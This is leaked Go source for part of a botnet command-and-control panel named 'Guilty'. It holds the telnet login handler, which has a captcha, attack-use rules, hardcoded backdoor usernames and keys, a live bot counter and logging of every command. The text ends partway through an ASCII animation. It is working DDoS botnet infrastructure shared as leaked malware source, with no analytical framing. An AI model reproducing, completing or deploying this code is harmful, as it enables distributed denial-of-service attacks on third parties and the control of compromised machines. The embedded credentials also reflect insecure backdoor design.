/*
██╗     ███████╗ █████╗ ██╗  ██╗███████╗██████╗     ██████╗ ██╗   ██╗    ███╗   ██╗ ██████╗  ██████╗████████╗██╗   ██╗██████╗ ███╗   ██╗ █████╗ ██╗     
██║     ██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝    ████╗  ██║██╔═══██╗██╔════╝╚══██╔══╝██║   ██║██╔══██╗████╗  ██║██╔══██╗██║     
██║     █████╗  ███████║█████╔╝ █████╗  ██║  ██║    ██████╔╝ ╚████╔╝     ██╔██╗ ██║██║   ██║██║        ██║   ██║   ██║██████╔╝██╔██╗ ██║███████║██║     
██║     ██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝      ██║╚██╗██║██║   ██║██║        ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══██║██║     
███████╗███████╗██║  ██║██║  ██╗███████╗██████╔╝    ██████╔╝   ██║       ██║ ╚████║╚██████╔╝╚██████╗   ██║   ╚██████╔╝██║  ██║██║ ╚████║██║  ██║███████╗
╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═════╝     ╚═════╝    ╚═╝       ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
                                                                 Discord: Nocturnal#1337 
                                                                 remember noodle cant code                                                                                      
*/

package main

import (
    "fmt"
    "io/ioutil"
    "math/rand"
    "net"
    "net/http"
    "strconv"
    "strings"
    "time"
    "image/color"
    "image/png"
    "log"
    "os"
)
func pnsg () {
        catFile, err := os.Open("/root/cat.png")
    if err != nil {
        log.Fatal(err)
    }
    defer catFile.Close()

    img, err := png.Decode(catFile)
    if err != nil {
        log.Fatal(err)
    }
 
    fmt.Println(img)
 
    levels := []string{" ", "░", "▒", "▓", "█"}
 
    for y := img.Bounds().Min.Y; y < img.Bounds().Max.Y; y++ {
        for x := img.Bounds().Min.X; x < img.Bounds().Max.X; x++ {
            c := color.GrayModel.Convert(img.At(x, y)).(color.Gray)
            level := c.Y / 51 
            if level == 5 {
                level--
            }
            fmt.Print(levels[level])
        }
        fmt.Print("\n")
    }
}
type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()    
    this.conn.Write([]byte(fmt.Sprintf("\033]0; https://discord.gg/bzPeuwKCuw\007")))

    var msg2 string
    var code int
    code = (rand.Intn(9)+1)*1000 + (rand.Intn(9)+1)*100 + (rand.Intn(9)+1)*10 + rand.Intn(10)
    this.conn.SetDeadline(time.Now().Add(1000 * time.Second))
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(banner()))
    this.conn.Write([]byte("\033[4;37mCapcha:\033[0m \033[4;37m" + strconv.Itoa(code) + "\033[0m\r\n"))
    this.conn.Write([]byte("\x1b[38;2;45;31;171m╔═\x1b[1;36m[\x1b[4;37mGuilty\x1b[0m\x1b[1;36m]\x1b[1;32m$\033[0m\r\n"))
    this.conn.Write([]byte("\x1b[38;2;45;31;171m╚═══════\x1b[1;36m>\033[0m "))
    pin, err := this.ReadLine(false)
    if err != nil || len(pin) != 4 {
        this.conn.Write([]byte("\r\033[31mCaptcha Incorrect\033[0m\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return 
    }

    cc, err := strconv.Atoi(pin)
    if err != nil || cc != code {
        this.conn.Write([]byte("\r\033[31mCaptcha Incorrect\033[0m\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
        this.conn.Write([]byte("\033[2J\033[1;1H"))
        this.conn.Write([]byte(banner()))
this.conn.Write([]byte("\x1b[38;2;45;31;171m ╔════════════════════╗     ╔════════════════════╗     ╔════════════════════╗\r\n"))
this.conn.Write([]byte("\x1b[38;2;45;31;171m ║    \033[00;1;96m1 = login       \x1b[38;2;45;31;171m║     ║     \033[00;1;96m2 = exit       \x1b[38;2;45;31;171m║     ║  \033[00;1;96m3 = info/creds    \x1b[38;2;45;31;171m║\r\n"))
this.conn.Write([]byte("\x1b[38;2;45;31;171m ╚════════════════════╝     ╚════════════════════╝     ╚════════════════════╝\r\n"))
this.conn.Write([]byte("\x1b[38;2;45;31;171m╔═\x1b[1;36m[\x1b[4;37mGuilty\x1b[0m\x1b[1;36m]\x1b[1;32m$\033[0m\r\n"))
    this.conn.Write([]byte("\x1b[38;2;45;31;171m╚═══════\x1b[1;36m>\033[0m "))
logop, err := this.ReadLine(false)        
if logop == "1" {
    goto login2;
}
if logop == "2" {
    return
} 
if logop == "3" {
    this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte(ban()))
            this.conn.Write([]byte("\033[1;36m                ╔═══════════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[1;36m                ║\x1b[1;37mThis c2 is made and owned by \x1b[4;37m@gmeongod\x1b[0m\x1b[1;37m         ║\r\n"))
            this.conn.Write([]byte("\033[1;36m                ║\x1b[1;37mPartners/PowerProviders: \x1b[4;37m@scotty101godly\x1b[0m\x1b[1;37m       ║\r\n"))
            this.conn.Write([]byte("\033[1;36m                ║ \x1b[4;37m@tcpoist\x1b[0m\x1b[1;37m                                      ║\r\n"))
            this.conn.Write([]byte("\033[1;36m                ╚═══════════════════════════════════════════════╝\r\n"))
            time.Sleep(50000 * time.Millisecond)
            return
}      
        return
        login2:
        this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte(banner()))
    this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ╔═══════════════════\033[00;1;96m═══════════════════╗\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Setting Up Your Se\033[00;1;96mssion...      [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Clearing Cache... \033[00;1;96m              [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Closing Backround \033[00;1;96mProcesses...  [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Securing Connectio\033[00;1;96mn...          [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Loading Terminal..\033[00;1;96m.             [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ╚═══════════════════\033[00;1;96m═══════════════════╝\033[0m\r\n"))
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
    this.conn.Write([]byte(banner()))
        this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ╔═══════════════════\033[00;1;96m═══════════════════╗\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Setting Up Your Se\033[00;1;96mssion...      [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Clearing Cache... \033[00;1;96m              [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Closing Backround \033[00;1;96mProcesses...  [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Securing Connectio\033[00;1;96mn...          [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Loading Terminal..\033[00;1;96m.             [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ╚═══════════════════\033[00;1;96m═══════════════════╝\033[0m\r\n"))
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
    this.conn.Write([]byte(banner()))
        this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ╔═══════════════════\033[00;1;96m═══════════════════╗\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Setting Up Your Se\033[00;1;96mssion...      [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Clearing Cache... \033[00;1;96m              [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Closing Backround \033[00;1;96mProcesses...  [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Securing Connectio\033[00;1;96mn...          [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Loading Terminal..\033[00;1;96m.             [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ╚═══════════════════\033[00;1;96m═══════════════════╝\033[0m\r\n"))
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
   this.conn.Write([]byte(banner()))
        this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ╔═══════════════════\033[00;1;96m═══════════════════╗\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Setting Up Your Se\033[00;1;96mssion...      [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Clearing Cache... \033[00;1;96m              [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Closing Backround \033[00;1;96mProcesses...  [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Securing Connectio\033[00;1;96mn...          [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Loading Terminal..\033[00;1;96m.             [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ╚═══════════════════\033[00;1;96m═══════════════════╝\033[0m\r\n"))
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
    this.conn.Write([]byte(banner()))
        this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ╔═══════════════════\033[00;1;96m═══════════════════╗\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Setting Up Your Se\033[00;1;96mssion...      [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Clearing Cache... \033[00;1;96m              [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Closing Backround \033[00;1;96mProcesses...  [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Securing Connectio\033[00;1;96mn...          [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Loading Terminal..\033[00;1;96m.             [\033[31mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ╚═══════════════════\033[00;1;96m═══════════════════╝\033[0m\r\n"))
        time.Sleep(500 * time.Millisecond)
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
    this.conn.Write([]byte(banner()))
        this.conn.Write([]byte("\033[31m                                       💔\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ╔═══════════════════\033[00;1;96m═══════════════════╗\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Setting Up Your Se\033[00;1;96mssion...      [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Clearing Cache... \033[00;1;96m              [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Closing Backround \033[00;1;96mProcesses...  [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Securing Connectio\033[00;1;96mn...          [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ║ Loading Terminal..\033[00;1;96m.             [\033[32mOK\033[00;1;96m] ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                    ╚═══════════════════\033[00;1;96m═══════════════════╝\033[0m\r\n")) //\x1b[38;2;45;31;171m         
    time.Sleep(4000 * time.Millisecond)
                this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte("\033[0m\r\n"))
    this.conn.Write([]byte(banner()))
        this.conn.Write([]byte("\x1b[1;37m                               🤡😈 \x1b[4;38;2;45;31;171mGuilty\x1b[0m\x1b[1;37m 😈🤡\x1b[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m               ╔════════════════════════\033[00;1;96m════════════════════════╗\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m               ║ \033[31mNO\x1b[38;2;45;31;171m ATTACKING GOVERMENT \033[00;1;96mIPS / WEBSITES!         ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m               ║ \033[31mNO\x1b[38;2;45;31;171m ABUSING ATTACK TIME \033[00;1;96m/ POWER / SPAMMING!     ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m               ║ \033[31mNO\x1b[38;2;45;31;171m SHARING YOUR LOGIN C\033[00;1;96mREDENTIALS!             ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m               ║ \033[31mNO\x1b[38;2;45;31;171m ATTACKING PUBLIC DST\033[00;1;96mATS!                    ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m               ║ TYPE '\033[31mEXIT\x1b[38;2;45;31;171m' BEFORE CHAN\033[00;1;96mGING CONNECTION TO VPN! ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m               ╚════════════════════════\033[00;1;96m════════════════════════╝\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                  ╔═════════════════════\033[00;1;96m═════════════════════╗\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                  ║ No Owners Will Take \033[00;1;96mResponibility Of You ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                  ╚══════════╦══════════\033[00;1;96m══════════╦══════════╝\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                             ║   Type '\033[34mi agree\033[00;1;96m'   ║\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m                             ╚══════════\033[00;1;96m══════════╝\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m╔═\x1b[1;36m[\x1b[4;37mGuilty\x1b[0m\x1b[1;36m]\x1b[1;32m$\033[0m\r\n"))
        this.conn.Write([]byte("\x1b[38;2;45;31;171m╚═══════\x1b[1;36m>\033[0m "))
        rules, err := this.ReadLine(false)
        if err != nil {
            return
        }

        rules = strings.ToLower(rules)

        if rules != "I AGREE" && rules != "i agree" {
            fmt.Fprintln(this.conn, "                             ║\033[31mYou Must Agree To Continue!\033[0m\r")
            time.Sleep(time.Duration(2000) * time.Millisecond)
            return
        }
    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(banner()))
    this.conn.Write([]byte("\x1b[38;2;45;31;171m╔═\x1b[1;36m[\x1b[4;37m𝓤𝓼𝓮𝓻𝓷𝓪𝓶𝓮\x1b[0m\x1b[1;36m]\x1b[1;32m$\033[0m\r\n"))//𝓤𝓼𝓮𝓻𝓷𝓪𝓶𝓮 𝓟𝓪𝓼𝓼𝔀𝓸𝓻𝓭
    this.conn.Write([]byte("\x1b[38;2;45;31;171m╚═══════\x1b[1;36m>\033[0m "))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }
    if username == "gme" || username == "ScottyDev" {
      this.conn.Write([]byte("\x1b[38;2;45;31;171mKey\x1b[1;36m>\033[0m "))
            keyv, err := this.ReadLine(false)
            if err != nil {
                return
            }  
    if keyv == "Sincere100" || keyv == "scottvibe101" {
        goto con;
    } else {
        return
    }
    }

    // Get password
    con:

    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte(banner()))
    this.conn.Write([]byte("\x1b[38;2;45;31;171m╔═\x1b[1;36m[\x1b[4;37m𝓟𝓪𝓼𝓼𝔀𝓸𝓻𝓭\x1b[0m\x1b[1;36m]\x1b[1;32m$\033[0m\r\n"))//𝓤𝓼𝓮𝓻𝓷𝓪𝓶𝓮 𝓟𝓪𝓼𝓼𝔀𝓸𝓻𝓭
    this.conn.Write([]byte("\x1b[38;2;45;31;171m╚═══════\x1b[1;36m>\033[0m "))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }
    motd := "loading"
        if len(password) > 300 || len(username) > 50 {
        return
    }

    /*--------------------------------------------------------------------------------------------------------------------------------------------*/

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\033[0m\r\n"))
    for i := 0; i < 100; i = i + 1 {
        lol := "%"
        this.conn.Write([]byte("\033[2J\033[1H"))
        fmt.Fprintf(this.conn, "\x1b[38;2;45;31;171mConnecting to terminal [\033[00;1;96m%d%s\x1b[38;2;45;31;171m]\r\n", i, lol)
        time.Sleep(time.Millisecond * 30)
        fmt.Fprint(this.conn, "\033[2J\033[1;1H")
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[00;31mInvalid Credentials. Connection Logged! You May Have Been Banned\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    if userInfo.admin == 3 {
        this.conn.Write([]byte("\033[2J\033[1H"))
        this.conn.Write([]byte(fmt.Sprintf("\033]0; Guilty.gov | Banned\007")))
        this.conn.Write([]byte("\033[31mYou Have Been Banned.\033[0m\r\n"))
        this.conn.Write([]byte("\033[31m\033[0m\r\n"))
        this.conn.Write([]byte("\033[31mReason Of Ban: Breaking Tos\033[0m\r\n"))
        this.conn.Write([]byte("\033[31mBanned By: Tos Detection Bot\033[0m\r\n"))
        this.conn.Write([]byte("\033[31m\033[0m\r\n"))
        this.conn.Write([]byte("\033[31mTo Be Unbanned You Must Pay a [3$] Fee!\033[0m\r\n"))
        this.conn.Write([]byte("\033[31mYou May Fight The Ban To Be Freely Unbanned!\033[0m\r\n"))
        this.conn.Write([]byte("\033[31mKeep In Mind This Could Be An Accidental Ban!\033[0m\r\n"))
        this.conn.Write([]byte("\033[31m\033[0m\r\n"))
        this.conn.Write([]byte("\033[31mYou WILL NOT Be Able To Be Unbanned If Your Ban Was Malicious.\033[0m\r\n"))
        this.conn.Write([]byte("\033[31m\033[0m\r\n"))
        time.Sleep(time.Second * 15)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }
 
            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;  [-%d-] Bots | Guilty | User: %s | UsersOnline: %d | Message: %s\007", BotCount, username, len(sessions), motd))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
        var session = &session{
                ID:       time.Now().UnixNano(),
                Username: username,
                Password: password,
                Admin: userInfo.admin,
                Conn:     this.conn,
                Msg: msg2,
        }

    sessionMutex.Lock()
    sessions[session.ID] = session
    sessionMutex.Unlock() 
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte(fmt.Sprintf("\033]0;  Guilty | User: %s | UsersOnline: %d | Message: %s\007", username, len(sessions), motd)))
            this.conn.Write([]byte(help2()))
    for {
        var botCatagory string
        var botCount int  
        session.Bhat = true                                                               
        this.conn.Write([]byte("\x1b[38;2;222;31;171m[\x1b[1;36mGuilty\x1b[38;2;222;31;171m]$ "))
        cmd, err := this.ReadLine(false)
        var history = &history{
                ID:       time.Now().UnixNano(),
                Username: username,
                Password: password,
                Admin: userInfo.admin,
                Conn:     this.conn,
                Msg: msg2,
                Cmdhis: cmd,
        }
    historyMutex.Lock()
    cmds[history.ID] = history
    historyMutex.Unlock()
        fmt.Println("%s\n", history)
        if err != nil || cmd == "LOGOUT" || cmd == "logout" {
            return
        }
        if cmd == "" {
            continue
        }

/*
╔

═

╗

║

╚

═

╝

╠╣ 
 ╦ didnt even mean to do that ;)
 ╩
*/
        if err != nil || cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" || cmd == "c" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte(fmt.Sprintf("\033]0;  Primitive | User: %s | UsersOnline: %d | Message: %s\007", username, len(sessions), motd)))
            this.conn.Write([]byte(help2()))
    continue
        }   //info
        if strings.Contains(cmd, "@") {
            this.conn.Write([]byte("\033[31mCrash Attempt Logged!\033[0m\r\n"))
            continue
        }

        if cmd == "gme" {
        				this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└──\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└──\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└──\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝╩ ╩\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗╔═╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝╩ ╩\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗╔═╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║║╣ \x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝╩ ╩\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗╔═╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║║╣ \x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝╩ ╩╚═╝\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗╔═╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║║╣ \x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝╩ ╩╚═╝o\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║║╣  \x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝╩ ╩╚═╝o\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║║╣  ║  \x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝╩ ╩╚═╝o\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║║╣  ║  \x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝╩ ╩╚═╝o╚═╝\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║║╣  ║  \x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m└── ╚═╝╩ ╩╚═╝o╚═╝\x1b[0m\r\n"))
			time.Sleep(400 * time.Millisecond)
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m┌─┐ ╔═╗╔╦╗╔═╗ ╔═╗╦═╗\x1b[0m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m│└┘ ║ ╦║║║║╣  ║  ╠╦╝\x1b[0m\r\n"))
